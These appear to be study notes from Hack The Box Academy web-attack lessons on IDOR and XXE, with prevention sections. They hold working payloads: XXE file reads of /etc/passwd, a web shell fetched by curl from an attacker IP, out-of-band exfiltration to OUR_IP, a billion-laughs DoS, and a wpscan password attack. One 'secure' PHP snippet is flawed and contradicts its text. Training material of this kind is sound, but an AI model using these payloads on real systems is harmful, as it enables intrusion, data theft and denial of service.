	> Now, we can refresh the page to update our cookie, or manually set it as Cookie: role=web_admin, and then intercept the Update request to create a new user and see if we'd be allowed to do so: => (https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_create_new_user_2.jpg)
	> We did not get an error message this time. If we send a GET request for the new user, we see that it has been successfully created: => (https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_get_new_user.jpg)

	> By combining the information we gained from the IDOR Information Disclosure vulnerability with an IDOR Insecure Function Calls attack on an API endpoint, we could modify other users' details and create/delete users while bypassing various access control checks in place. On many occasions, the information we leak through IDOR vulnerabilities can be utilized in other attacks, like IDOR or XSS, leading to more sophisticated attacks or bypassing existing security mechanisms.
	> With our new role, we may also perform mass assignments to change specific fields for all users, like placing XSS payloads in their profiles or changing their email to an email we specify. Try to write a script that changes all users' email to an email you choose.. You may do so by retrieving their uuids and then sending a PUT request for each with the new email.

-=-=-=-
[+] IDOR Prevention
	> We learned various ways to identify and exploit IDOR vulnerabilities in web pages, web functions, and API calls. By now, we should have understood that IDOR vulnerabilities are mainly caused by improper access control on the back-end servers. To prevent such vulnerabilities, we first have to build an object-level access control system and then use secure references for our objects when storing and calling them.

* Object-Level Access Control
	> An Access Control system should be at the core of any web application since it can affect its entire design and structure. To properly control each area of the web application, its design has to support the segmentation of roles and permissions in a centralized manner. However, Access Control is a vast topic, so we will only focus on its role in IDOR vulnerabilities, represented in Object-Level access control mechanisms.
	> User roles and permissions are a vital part of any access control system, which is fully realized in a Role-Based Access Control (RBAC) system. To avoid exploiting IDOR vulnerabilities, we must map the RBAC to all objects and resources. The back-end server can allow or deny every request, depending on whether the requester's role has enough privileges to access the object or the resource.
	> Once an RBAC has been implemented, each user would be assigned a role that has certain privileges. Upon every request the user makes, their roles and privileges would be tested to see if they have access to the object they are requesting. They would only be allowed to access it if they have the right to do so.
	> There are many ways to implement an RBAC system and map it to the web application's objects and resources, and designing it in the core of the web application's structure is an art to perfect. The following is a sample code of how a web application may compare user roles to objects to allow or deny access control:
		Code: javascript
		match /api/profile/{userId} {
		    allow read, write: if user.isAuth == true
		    && (user.uid == userId || user.roles == 'admin');
		}

	> The above example uses the user token, which can be mapped from the HTTP request made to the RBAC to retrieve the user's various roles and privileges. Then, it only allows read/write access if the user's uid in the RBAC system matches the uid in the API endpoint they are requesting. Furthermore, if a user has admin as their role in the back-end RBAC, they are allowed read/write access.
	> In our previous attacks, we saw examples of the user role being stored in the user's details or in their cookie, both of which are under the user's control and can be manipulated to escalate their access privileges. The above example demonstrates a safer approach to mapping user roles, as the user privileges were not be passed through the HTTP request, but mapped directly from the RBAC on the back-end using the user's logged-in session token as an authentication mechanism.
	> There's a lot more to access control systems and RBACs, as they can be some of the most challenging systems to design. This, however, should give us an idea of how we should control user access over web applications' objects and resources.

* Object Referencing
	> While the core issue with IDOR lies in broken access control (Insecure), having access to direct references to objects (Direct Object Referencing) makes it possible to enumerate and exploit these access control vulnerabilities. We may still use direct references, but only if we have a solid access control system implemented.
	> Even after building a solid access control system, we should never use object references in clear text or simple patterns (e.g. uid=1). We should always use strong and unique references, like salted hashes or UUID's. For example, we can use UUID V4 to generate a strongly randomized id for any element, which looks something like (89c9b29b-d19f-4515-b2dd-abb6e693eb20). Then, we can map this UUID to the object it is referencing in the back-end database, and whenever this UUID is called, the back-end database would know which object to return. The following example PHP code shows us how this may work:

		Code: php
		
		$uid = intval($_REQUEST['uid']);
		$query = "SELECT url FROM documents where uid=" . $uid;
		$result = mysqli_query($conn, $query);
		$row = mysqli_fetch_array($result));
		echo "<a href='" . $row['url'] . "' target='_blank'></a>";

	> Furthermore, as we have seen previously in the module, we should never calculate hashes on the front-end. We should generate them when an object is created and store them in the back-end database. Then, we should create database maps to enable quick cross-referencing of objects and references.
	> Finally, we must note that using UUIDs may let IDOR vulnerabilities go undetected since it makes it more challenging to test for IDOR vulnerabilities. This is why strong object referencing is always the second step after implementing a strong access control system. Furthermore, some of the techniques we learned in this module would work even with unique references if the access control system is broken, like repeating one user's request with another user's session, as we have previously seen.
	> If we implement both of these security mechanisms, we should be relatively safe against IDOR vulnerabilities.

-=-=-==
[+] Intro to XXE

	> XML External Entity (XXE) Injection vulnerabilities occur when XML data is taken from a user-controlled input without properly sanitizing or safely parsing it, which may allow us to use XML features to perform malicious actions. XXE vulnerabilities can cause considerable damage to a web application and its back-end server, from disclosing sensitive files to shutting the back-end server down, which is why it is considered one of the Top 10 Web Security Risks by OWASP.

* XML
	> Extensible Markup Language (XML) is a common markup language (similar to HTML and SGML) designed for flexible transfer and storage of data and documents in various types of applications. XML is not focused on displaying data but mostly on storing documents' data and representing data structures. XML documents are formed of element trees, where each element is essentially denoted by a tag, and the first element is called the root element, while other elements are child elements.
	> Here we see a basic example of an XML document representing an e-mail document structure:
		Code: xml
		
		<?xml version="1.0" encoding="UTF-8"?>
		<email>
		  <date>01-01-2022</date>
		  <time>10:00 am UTC</time>
		  <sender>john@inlanefreight.com</sender>
		  <recipients>
		    <to>HR@inlanefreight.com</to>
		    <cc>
		        <to>billing@inlanefreight.com</to>
		        <to>payslips@inlanefreight.com</to>
		    </cc>
		  </recipients>
		  <body>
		  Hello,
		      Kindly share with me the invoice for the payment made on January 1, 2022.
		  Regards,
		  John
		  </body> 
		</email>

	> The above example shows some of the key elements of an XML document, like:
	Key 		Definition 								Example
	Tag 		The keys of an XML document, usually wrapped with (</>) characters. 	<date>
	Entity 		XML variables, usually wrapped with (&/;) characters. 			&lt;
	Element 	The root element or any of its child elements, and its value 
			is stored in between a start-tag and an end-tag. 			<date>01-01-2022</date>
	Attribute 	Optional specifications for any element that are stored in the tags, 	
			which may be used by the XML parser. 					version="1.0"/encoding="UTF-8"
	Declaration 	Usually the first line of an XML document, and defines the XML 
			version and encoding to use when parsing it. 				<?xml version="1.0" encoding="UTF-8"?>

	> Furthermore, some characters are used as part of an XML document structure, like <, >, &, or ". So, if we need to use them in an XML document, we should replace them with their corresponding entity references (e.g. &lt;, &gt;, &amp;, &quot;). Finally, we can write comments in XML documents between <!-- and -->, similar to HTML documents.

* XML DTD
	> XML Document Type Definition (DTD) allows the validation of an XML document against a pre-defined document structure. The pre-defined document structure can be defined in the document itself or in an external file. The following is an example DTD for the XML document we saw earlier:
		Code: xml
		
		<!DOCTYPE email [
		  <!ELEMENT email (date, time, sender, recipients, body)>
		  <!ELEMENT recipients (to, cc?)>
		  <!ELEMENT cc (to*)>
		  <!ELEMENT date (#PCDATA)>
		  <!ELEMENT time (#PCDATA)>
		  <!ELEMENT sender (#PCDATA)>
		  <!ELEMENT to  (#PCDATA)>
		  <!ELEMENT body (#PCDATA)>
		]>

	> As we can see, the DTD is declaring the root email element with the ELEMENT type declaration and then denoting its child elements. After that, each of the child elements is also declared, where some of them also have child elements, while others may only contain raw data (as denoted by PCDATA).
	> The above DTD can be placed within the XML document itself, right after the XML Declaration in the first line. Otherwise, it can be stored in an external file (e.g. email.dtd), and then referenced within the XML document with the SYSTEM keyword, as follows:
		Code: xml
		
		<?xml version="1.0" encoding="UTF-8"?>
		<!DOCTYPE email SYSTEM "email.dtd">

	> It is also possible to reference a DTD through a URL, as follows:
		Code: xml
		
		<?xml version="1.0" encoding="UTF-8"?>
		<!DOCTYPE email SYSTEM "http://inlanefreight.com/email.dtd">

	> This is relatively similar to how HTML documents define and reference JavaScript and CSS scripts.

* XML Entities
	> We may also define custom entities (i.e. XML variables) in XML DTDs, to allow refactoring of variables and reduce repetitive data. This can be done with the use of the ENTITY keyword, which is followed by the entity name and its value, as follows:
		Code: xml
		
		<?xml version="1.0" encoding="UTF-8"?>
		<!DOCTYPE email [
		  <!ENTITY company "Inlane Freight">
		]>

	> Once we define an entity, it can be referenced in an XML document between an ampersand & and a semi-colon ; (e.g. &company;). Whenever an entity is referenced, it will be replaced with its value by the XML parser. Most interestingly, however, we can reference External XML Entities with the SYSTEM keyword, which is followed by the external entity's path, as follows:
		Code: xml
		
		<?xml version="1.0" encoding="UTF-8"?>
		<!DOCTYPE email [
		  <!ENTITY company SYSTEM "http://localhost/company.txt">
		  <!ENTITY signature SYSTEM "file:///var/www/html/signature.txt">
		]>

	> Note: We may also use the PUBLIC keyword instead of SYSTEM for loading external resources, which is used with publicly declared entities and standards, such as a language code (lang="en"). In this module, we'll be using SYSTEM, but we should be able to use either in most cases.
	> This works similarly to internal XML entities defined within documents. When we reference an external entity (e.g. &signature;), the parser will replace the entity with its value stored in the external file (e.g. signature.txt). When the XML file is parsed on the server-side, in cases like SOAP (XML) APIs or web forms, then an entity can reference a file stored on the back-end server, which may eventually be disclosed to us when we reference the entity.
	> In the next section, we will see how we can use External XML Entities to read local files or even perform more malicious actions.

-=-=-=
[+] Local File Disclosure
	> When a web application trusts unfiltered XML data from user input, we may be able to reference an external XML DTD document and define new custom XML entities. Suppose we can define new entities and have them displayed on the web page. In that case, we should also be able to define external entities and make them reference a local file, which, when displayed, should show us the content of that file on the back-end server.
	> Let us see how we can identify potential XXE vulnerabilities and exploit them to read sensitive files from the back-end server.

* Identifying
	> The first step in identifying potential XXE vulnerabilities is finding web pages that accept an XML user input. We can start the exercise at the end of this section, which has a Contact Form:
	> If we fill the contact form and click on Send Data, then intercept the HTTP request with Burp, we get the following request:
		(https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_request.jpg)

	> As we can see, the form appears to be sending our data in an XML format to the web server, making this a potential XXE testing target. Suppose the web application uses outdated XML libraries, and it does not apply any filters or sanitization on our XML input. In that case, we may be able to exploit this XML form to read local files.
	> If we send the form without any modification, we get the following message:
	> We see that the value of the email element is being displayed back to us on the page. To print the content of an external file to the page, we should note which elements are being displayed, such that we know which elements to inject into. In some cases, no elements may be displayed, which we will cover how to exploit in the upcoming sections.
	> For now, we know that whatever value we place in the <email></email> element gets displayed in the HTTP response. So, let us try to define a new entity and then use it as a variable in the email element to see whether it gets replaced with the value we defined. To do so, we can use what we learned in the previous section for defining new XML entities and add the following lines after the first line in the XML input:
		Code: xml
		
		<!DOCTYPE email [
		  <!ENTITY company "Inlane Freight">
		]>

	> Note: In our example, the XML input in the HTTP request had no DTD being declared within the XML data itself, or being referenced externally, so we added a new DTD before defining our entity. If the DOCTYPE was already declared in the XML request, we would just add the ENTITY element to it.
	> Now, we should have a new XML entity called company, which we can reference with &company;. So, instead of using our email in the email element, let us try using &company;, and see whether it will be replaced with the value we defined (Inlane Freight):
	> As we can see, the response did use the value of the entity we defined (Inlane Freight) instead of displaying &company;, indicating that we may inject XML code. In contrast, a non-vulnerable web application would display (&company;) as a raw value. This confirms that we are dealing with a web application vulnerable to XXE.
	> Note: Some web applications may default to a JSON format in HTTP request, but may still accept other formats, including XML. So, even if a web app sends requests in a JSON format, we can try changing the Content-Type header to application/xml, and then convert the JSON data to XML with an online tool(https://www.convertjson.com/json-to-xml.htm). If the web application does accept the request with XML data, then we may also test it against XXE vulnerabilities, which may reveal an unanticipated XXE vulnerability.

* Reading Sensitive Files
	> Now that we can define new internal XML entities let's see if we can define external XML entities. Doing so is fairly similar to what we did earlier, but we'll just add the SYSTEM keyword and define the external reference path after it, as we have learned in the previous section:
		Code: xml
		
		<!DOCTYPE email [
		  <!ENTITY company SYSTEM "file:///etc/passwd">
		]>

	> Let us now send the modified request and see whether the value of our external XML entity gets set to the file we reference:
	> We see that we did indeed get the content of the /etc/passwd file, meaning that we have successfully exploited the XXE vulnerability to read local files. This enables us to read the content of sensitive files, like configuration files that may contain passwords or other sensitive files like an id_rsa SSH key of a specific user, which may grant us access to the back-end server. We can refer to the File Inclusion / Directory Traversal module to see what attacks can be carried out through local file disclosure.
	> Tip: In certain Java web applications, we may also be able to specify a directory instead of a file, and we will get a directory listing instead, which can be useful for locating sensitive files.

* Reading Source Code
	> Another benefit of local file disclosure is the ability to obtain the source code of the web application. This would allow us to perform a Whitebox Penetration Test to unveil more vulnerabilities in the web application, or at the very least reveal secret configurations like database passwords or API keys.
	> So, let us see if we can use the same attack to read the source code of the index.php file, as follows:
		<!ENTITY company SYSTEM "file://index.php"

	> As we can see, this did not work, as we did not get any content. This happened because the file we are referencing is not in a proper XML format, so it fails to be referenced as an external XML entity. If a file contains some of XML's special characters (e.g. </>/&), it would break the external entity reference and not be used for the reference. Furthermore, we cannot read any binary data, as it would also not conform to the XML format.
	> Luckily, PHP provides wrapper filters that allow us to base64 encode certain resources 'including files', in which case the final base64 output should not break the XML format. To do so, instead of using file:// as our reference, we will use PHP's php://filter/ wrapper. With this filter, we can specify the convert.base64-encode encoder as our filter, and then add an input resource (e.g. resource=index.php), as follows:
		Code: xml
		
		<!DOCTYPE email [
		  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
		]>

	> With that, we can send our request, and we will get the base64 encoded string of the index.php file:
	> We can select the base64 string, click on Burp's Inspector tab (on the right pane), and it will show us the decoded file. For more on PHP filters, you can refer to the File Inclusion / Directory Traversal module.
	> This trick only works with PHP web applications. The next section will discuss a more advanced method for reading source code, which should work with any web framework.

* Remote Code Execution with XXE
	> In addition to reading local files, we may be able to gain code execution over the remote server. The easiest method would be to look for ssh keys, or attempt to utilize a hash stealing trick in Windows-based web applications, by making a call to our server. If these do not work, we may still be able to execute commands on PHP-based web applications through the PHP://expect filter, though this requires the PHP expect module to be installed and enabled.
	> If the XXE directly prints its output 'as shown in this section', then we can execute basic commands as expect://id, and the page should print the command output. However, if we did not have access to the output, or needed to execute a more complicated command 'e.g. reverse shell', then the XML syntax may break and the command may not execute.
	> The most efficient method to turn XXE into RCE is by fetching a web shell from our server and writing it to the web app, and then we can interact with it to execute commands. To do so, we can start by writing a basic PHP web shell and starting a python web server, as follows:
		m1l0js@htb[/htb]$ echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
		m1l0js@htb[/htb]$ sudo python3 -m http.server 80

	> Now, we can use the following XML code to execute a curl command that downloads our web shell into the remote server:
		Code: xml
		
		<?xml version="1.0"?>
		<!DOCTYPE email [
		  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
		]>
		<root>
		<name></name>
		<tel></tel>
		<email>&company;</email>
		<message></message>
		</root>

	> Note: We replaced all spaces in the above XML code with $IFS, to avoid breaking the XML syntax. Furthermore, many other characters like |, >, and { may break the code, so we should avoid using them.
	> Once we send the request, we should receive a request on our machine for the shell.php file, after which we can interact with the web shell on the remote server for code execution.
	> Note: The expect module is not enabled/installed by default on modern PHP servers, so this attack may not always work. This is why XXE is usually used to disclose sensitive local files and source code, which may reveal additional vulnerabilities or ways to gain code execution.

* Other XXE Attacks
	> Another common attack often carried out through XXE vulnerabilities is SSRF exploitation, which is used to enumerate locally open ports and access their pages, among other restricted web pages, through the XXE vulnerability. The Server-Side Attacks module thoroughly covers SSRF, and the same techniques can be carried with XXE attacks.
	> Finally, one common use of XXE attacks is causing a Denial of Service (DOS) to the hosting web server, with the use the following payload:
		Code: xml
		
		<?xml version="1.0"?>
		<!DOCTYPE email [
		  <!ENTITY a0 "DOS" >
		  <!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
		  <!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
		  <!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
		  <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
		  <!ENTITY a5 "&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;">
		  <!ENTITY a6 "&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;">
		  <!ENTITY a7 "&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;">
		  <!ENTITY a8 "&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;">
		  <!ENTITY a9 "&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;">        
		  <!ENTITY a10 "&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;">        
		]>
		<root>
		<name></name>
		<tel></tel>
		<email>&a10;</email>
		<message></message>
		</root>

	> This payload defines the a0 entity as DOS, references it in a1 multiple times, references a1 in a2, and so on until the back-end server's memory runs out due to the self-reference loops. However, this attack no longer works with modern web servers (e.g., Apache), as they protect against entity self-reference. Try it against this exercise, and see if it works.

-=-=-=-=
[+] Advanced File Disclosure
	> Not all XXE vulnerabilities may be straightforward to exploit, as we have seen in the previous section. Some file formats may not be readable through basic XXE, while in other cases, the web application may not output any input values in some instances, so we may try to force it through errors.

* Advanced Exfiltration with CDATA
	> In the previous section, we saw how we could use PHP filters to encode PHP source files, such that they would not break the XML format when referenced, which (as we saw) prevented us from reading these files. But what about other types of Web Applications? We can utilize another method to extract any kind of data (including binary data) for any web application backend. To output data that does not conform to the XML format, we can wrap the content of the external file reference with a CDATA tag (e.g. <![CDATA[ FILE_CONTENT ]]>). This way, the XML parser would consider this part raw data, which may contain any type of data, including any special characters.
	> One easy way to tackle this issue would be to define a begin internal entity with <![CDATA[, an end internal entity with ]]>, and then place our external entity file in between, and it should be considered as a CDATA element, as follows:
		Code: xml
		
		<!DOCTYPE email [
		  <!ENTITY begin "<![CDATA[">
		  <!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php">
		  <!ENTITY end "]]>">
		  <!ENTITY joined "&begin;&file;&end;">
		]>

	> After that, if we reference the &joined; entity, it should contain our escaped data. However, this will not work, since XML prevents joining internal and external entities, so we will have to find a better way to do so.
	> To bypass this limitation, we can utilize XML Parameter Entities, a special type of entity that starts with a % character and can only be used within the DTD. What's unique about parameter entities is that if we reference them from an external source (e.g., our own server), then all of them would be considered as external and can be joined, as follows:
		Code: xml
		<!ENTITY joined "%begin;%file;%end;">

	> So, let's try to read the submitDetails.php file by first storing the above line in a DTD file (e.g. xxe.dtd), host it on our machine, and then reference it as an external entity on the target web application, as follows:
		m1l0js@htb[/htb]$ echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
		m1l0js@htb[/htb]$ python3 -m http.server 8000
		
		Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

	> Now, we can reference our external entity (xxe.dtd) and then print the &joined; entity we defined above, which should contain the content of the submitDetails.php file, as follows:
		Code: xml
		
		<!DOCTYPE email [
		  <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
		  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
		  <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
		  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> <!-- reference our external DTD -->
		  %xxe;
		]>
		...
		<email>&joined;</email> <!-- reference the &joined; entity to print the file content -->
	> Once we write our xxe.dtd file, host it on our machine, and then add the above lines to our HTTP request to the vulnerable web application, we can finally get the content of the submitDetails.php file: php_cdata
	> As we can see, we were able to obtain the file's source code without needing to encode it to base64, which saves a lot of time when going through various files to look for secrets and passwords.
	> Note: In some modern web servers, we may not be able to read some files (like index.php), as the web server would be preventing a DOS attack caused by file/entity self-reference (i.e., XML entity reference loop), as mentioned in the previous section.
	> This trick can become very handy when the basic XXE method does not work or when dealing with other web development frameworks. Try to use this trick to read other files.

* Error Based XXE
	> Another situation we may find ourselves in is one where the web application might not write any output, so we cannot control any of the XML input entities to write its content. In such cases, we would be blind to the XML output and so would not be able to retrieve the file content using our usual methods.
	> If the web application displays runtime errors (e.g., PHP errors) and does not have proper exception handling for the XML input, then we can use this flaw to read the output of the XXE exploit. If the web application neither writes XML output nor displays any errors, we would face a completely blind situation, which we will discuss in the next section.
	> Let's consider the exercise we have in /error at the end of this section, in which none of the XML input entities is displayed on the screen. Because of this, we have no entity that we can control to write the file output. First, let's try to send malformed XML data, and see if the web application displays any errors. To do so, we can delete any of the closing tags, change one of them, so it does not close (e.g. <roo> instead of <root>), or just reference a non-existing entity, as follows: cause_error
		(https://academy.hackthebox.com/storage/modules/134/web_attacks_xxe_cause_error.jpg)
		<email>
			&nonExistingEntity;
		</email>

	> We see that we did indeed cause the web application to display an error, and it also revealed the web server directory, which we can use to read the source code of other files. Now, we can exploit this flaw to exfiltrate file content. To do so, we will use a similar technique to what we used earlier. First, we will host a DTD file that contains the following payload:
		Code: xml
		
		<!ENTITY % file SYSTEM "file:///etc/hosts">
		<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">

	> The above payload defines the file parameter entity and then joins it with an entity that does not exist. In our previous exercise, we were joining three strings. In this case, %nonExistingEntity; does not exist, so the web application would throw an error saying that this entity does not exist, along with our joined %file; as part of the error. There are many other variables that can cause an error, like a bad URI or having bad characters in the referenced file.
	> Now, we can call our external DTD script, and then reference the error entity, as follows:
		Code: xml
		
		<!DOCTYPE email [ 
		  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
		  %remote;
		  %error;
		]>

	> Once we host our DTD script as we did earlier and send the above payload as our XML data (no need to include any other XML data), we will get the content of the /etc/hosts file as follows: exfil_error

	> This method may also be used to read the source code of files. All we have to do is change the file name in our DTD script to point to the file we want to read (e.g. "file:///var/www/html/submitDetails.php"). However, this method is not as reliable as the previous method for reading source files, as it may have length limitations, and certain special characters may still break it.

-=-=-=
[+] Blind Data Exfiltration
	> In the previous section, we saw an example of a blind XXE vulnerability, where we did not receive any output containing any of our XML input entities. As the web server was displaying PHP runtime errors, we could use this flaw to read the content of files from the displayed errors. In this section, we will see how we can get the content of files in a completely blind situation, where we neither get the output of any of the XML entities nor do we get any PHP errors displayed.

* Out-of-band Data Exfiltration
	> If we try to repeat any of the methods with the exercise we find at /blind, we will quickly notice that none of them seem to work, as we have no way to have anything printed on the web application response. For such cases, we can utilize a method known as Out-of-band (OOB) Data Exfiltration, which is often used in similar blind cases with many web attacks, like blind SQL injections, blind command injections, blind XSS, and of course, blind XXE. Both the Cross-Site Scripting (XSS) and the Whitebox Pentesting 101: Command Injections modules discussed similar attacks, and here we will utilize a similar attack, with slight modifications to fit our XXE vulnerability.
	> In our previous attacks, we utilized an out-of-band attack since we hosted the DTD file in our machine and made the web application connect to us (hence out-of-band). So, our attack this time will be pretty similar, with one significant difference. Instead of having the web application output our file entity to a specific XML entity, we will make the web application send a web request to our web server with the content of the file we are reading.
	> To do so, we can first use a parameter entity for the content of the file we are reading while utilizing PHP filter to base64 encode it. Then, we will create another external parameter entity and reference it to our IP, and place the file parameter value as part of the URL being requested over HTTP, as follows:

		Code: xml
		
		<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
		<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">

	> If, for example, the file we want to read had the content of XXE_SAMPLE_DATA, then the file parameter would hold its base64 encoded data (WFhFX1NBTVBMRV9EQVRB). When the XML tries to reference the external oob parameter from our machine, it will request http://OUR_IP:8000/?content=WFhFX1NBTVBMRV9EQVRB. Finally, we can decode the WFhFX1NBTVBMRV9EQVRB string to get the content of the file. We can even write a simple PHP script that automatically detects the encoded file content, decodes it, and outputs it to the terminal:
		Code: php
		
		<?php
		if(isset($_GET['content'])){
		    error_log("\n\n" . base64_decode($_GET['content']));
		}
		?>

	> So, we will first write the above PHP code to index.php, and then start a PHP server on port 8000, as follows:
		m1l0js@htb[/htb]$ vi index.php # here we write the above PHP code
		m1l0js@htb[/htb]$ php -S 0.0.0.0:8000

	> Now, to initiate our attack, we can use a similar payload to the one we used in the error-based attack, and simply add <root>&content;</root>, which is needed to reference our entity and have it send the request to our machine with the file content:
		Code: xml
		
		<?xml version="1.0" encoding="UTF-8"?>
		<!DOCTYPE email [ 
		  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
		  %remote;
		  %oob;
		]>
		<root>&content;</root>

	> Then, we can send our request to the web application: blind_request
	> Finally, we can go back to our terminal, and we will see that we did indeed get the request and its decoded content:

	> Tip: In addition to storing our base64 encoded data as a parameter to our URL, we may utilize DNS OOB Exfiltration by placing the encoded data as a sub-domain for our URL (e.g. ENCODEDTEXT.our.website.com), and then use a tool like tcpdump to capture any incoming traffic and decode the sub-domain string to get the data. Granted, this method is more advanced and requires more effort to exfiltrate data through.

* Automated OOB Exfiltration
	> Although in some instances we may have to use the manual method we learned above, in many other cases, we can automate the process of blind XXE data exfiltration with tools. One such tool is XXEinjector(https://github.com/enjoiz/XXEinjector). This tool supports most of the tricks we learned in this module, including basic XXE, CDATA source exfiltration, error-based XXE, and blind OOB XXE.
	> To use this tool for automated OOB exfiltration, we can first clone the tool to our machine, as follows:
		m1l0js@htb[/htb]$ git clone https://github.com/enjoiz/XXEinjector.git
	> Once we have the tool, we can copy the HTTP request from Burp and write it to a file for the tool to use. We should not include the full XML data, only the first line, and write XXEINJECT after it as a position locator for the tool:
		Code: http
		
		POST /blind/submitDetails.php HTTP/1.1
		Host: 10.129.201.94
		Content-Length: 169
		User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
		Content-Type: text/plain;charset=UTF-8
		Accept: */*
		Origin: http://10.129.201.94
		Referer: http://10.129.201.94/blind/
		Accept-Encoding: gzip, deflate
		Accept-Language: en-US,en;q=0.9
		Connection: close
		
		<?xml version="1.0" encoding="UTF-8"?>
		XXEINJECT

	> Now, we can run the tool with the --host/--httpport flags being our IP and port, the --file flag being the file we wrote above, and the --path flag being the file we want to read. We will also select the --oob=http and --phpfilter flags to repeat the OOB attack we did above, as follows:
		m1l0js@htb[/htb]$ ruby XXEinjector.rb --host=127.0.0.1 --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
		
		...SNIP...
		[+] Sending request with malicious XML.
		[+] Responding with XML for: /etc/passwd
		[+] Retrieved data:

	> We see that the tool did not directly print the data. This is because we are base64 encoding the data, so it does not get printed. In any case, all exfiltrated files get stored in the Logs folder under the tool, and we can find our file there:

		m1l0js@htb[/htb]$ cat Logs/10.129.201.94/etc/passwd.log 
		
		root:x:0:0:root:/root:/bin/bash
		daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
		...SNIP..

-=-=-=
[+] XXE Prevention
	> We have seen that XXE vulnerabilities mainly occur when an unsafe XML input references an external entity, which is eventually exploited to read sensitive files and perform other actions. Preventing XXE vulnerabilities is relatively easier than preventing other web vulnerabilities, as they are caused mainly by outdated XML libraries.

* Avoiding Outdated Components
	> While other input validation web vulnerabilities are usually prevented through secure coding practices (e.g., XSS, IDOR, SQLi, OS Injection), this is not entirely necessary to prevent XXE vulnerabilities. This is because XML input is usually not handled manually by the web developers but by the built-in XML libraries instead. So, if a web application is vulnerable to XXE, this is very likely due to an outdated XML library that parses the XML data.
	> For example, PHP's libxml_disable_entity_loader function is deprecated since it allows a developer to enable external entities in an unsafe manner, which leads to XXE vulnerabilities. If we visit PHP's documentation for this function, we see the following warning:
	> Warning
		This function has been DEPRECATED as of PHP 8.0.0. Relying on this function is highly discouraged.

	> Furthermore, even common code editors (e.g., VSCode) will highlight that this specific function is deprecated and will warn us against using it 
	> Note: You can find a detailed report of all vulnerable XML libraries, with recommendations on updating them and using safe functions, in OWASP's XXE Prevention Cheat Sheet. => (https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#php)
	> These issues are not exclusive to XML libraries only, as the same applies to all other web components (e.g., outdated Node Modules). In addition to common package managers (e.g. npm), common code editors will notify web developers of the use of outdated components and suggest other alternatives. In the end, using the latest XML libraries and web development components can greatly help reduce various web vulnerabilities, including XXE.

* Using Safe XML Configurations
	> Other than using the latest XML libraries, certain XML configurations for web applications can help reduce the possibility of XXE exploitation. These include:
    		- Disable referencing custom Document Type Definitions (DTDs)
    		- Disable referencing External XML Entities
    		- Disable Parameter Entity processing
    		- Disable support for XInclude
    		- Prevent Entity Reference Loops

	> Another thing we saw was Error-based XXE exploitation. So, we should always have proper exception handling in our web applications and should always disable displaying runtime errors in web servers.
	> Such configurations should be another layer of protection if we miss updating some XML libraries and should also prevent XXE exploitation. However, we may still be using vulnerable libraries in such cases and only applying workarounds against exploitation, which is not ideal.
	> With the various issues and vulnerabilities introduced by XML data, many also recommend using other formats, such as JSON or YAML. This also includes avoiding API standards that rely on XML (e.g., SOAP) and using JSON-based APIs instead (e.g., REST).
	> Finally, using Web Application Firewalls (WAFs) is another layer of protection against XXE exploitation. However, we should never entirely rely on WAFs and leave the back-end vulnerable, as WAFs can always be bypassed.

-------------=============
[+] Attacking common applications

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `sudo vim /etc/hosts`                                        | Opens the `/etc/hosts` with `vim` to start adding hostnames  |
| `sudo nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list` | Runs an nmap scan using common web application ports based on a scope list (`scope_list`) and outputs to a file (`web_discovery`) in all formats (`-oA`) |
| `eyewitness --web -x web_discovery.xml -d <nameofdirectorytobecreated>` | Runs `eyewitness` using a file generated by an nmap scan (`web_discovery.xml`) and creates a directory (`-d`) |
| `cat web_discovery.xml \| ./aquatone -nmap`                  | Concatenates the contents of nmap scan output (web_discovery.xml) and pipes it (`|`) aquatone (`./aquatone`)and ensures aquatone recognizes the file as nmap scan output (`-nmap`) |
| `sudo wpscan --url <http://domainnameoripaddress> --enumerate` | Runs wpscan using the `--enmuerate` flag. Can replace the url with any valid and reachable URL in each challenge |
| `sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url <http://domainnameoripaddress>` | Runs wpscan and uses it to perform a password attack (`--password-attack`) against the specified url and references a word list (`/usr/share/wordlists/rockyou.txt`) |
